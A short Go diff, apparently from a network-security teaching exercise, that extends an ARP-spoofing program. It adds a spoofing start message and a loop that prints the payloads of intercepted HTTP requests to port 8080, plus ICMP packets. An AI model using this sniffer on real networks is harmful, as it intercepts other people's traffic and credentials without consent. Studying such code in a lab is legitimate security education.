@@ -82,6 +82,7 @@ func main() {
 	}
 
 	// Todo: ARPリプライを送信し続けてください
+	fmt.Println("start ARP spoofing...")
 	go func() {
 		for {
 			time.Sleep(1000 * time.Millisecond)
@@ -92,10 +93,13 @@ func main() {
 	// Todo: ICMPを受信してください
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
-		ethernetPacket := ethernetLayer.(*layers.Ethernet)
-		if ethernetPacket.EthernetType.LayerType() == layers.LayerTypeIPv4 {
-			fmt.Printf("packet is %+v\n", packet)
+		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
+			tcp, _ := tcpLayer.(*layers.TCP)
+			if len(tcp.Payload) != 0 && tcp.DstPort == 8080 {
+				fmt.Printf("HTTP Request is %s\n", string(tcp.Payload))
+			}
+		} else if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
+			fmt.Printf("ICMP is %+v\n", icmpLayer)
 		}
 	}
 
